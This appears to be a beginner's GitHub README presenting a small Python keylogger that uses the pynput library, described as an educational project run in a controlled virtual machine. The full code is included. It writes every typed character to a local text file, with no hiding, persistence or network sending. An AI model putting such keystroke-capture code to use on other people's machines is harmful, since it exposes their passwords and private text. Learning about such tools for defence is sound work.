# KeyLogger
Excited to share my first-ever cybersecurity project: a keylogger developed in Python using the pynput library! 🎉 As part of my journey to deepen my understanding of cybersecurity, I built this in a controlled virtual environment to explore how such tools work, analyze their behavior, and develop detection/mitigation strategies.

Key takeaways from this project:

Gained hands-on experience with Python programming and system monitoring.
Learned to simulate and analyze malicious software behavior ethically.
Created a detection script to identify keylogger activity, enhancing my defensive skills.
This was a safe, educational exercise conducted solely on my own systems, with a focus on understanding threats to better protect against them.


Here below is the code, since I'm new to GitHub I wasn't able to link the code file hence pasted the code below. Promise I will learn by the time of my next project.

_________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("KeyFile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
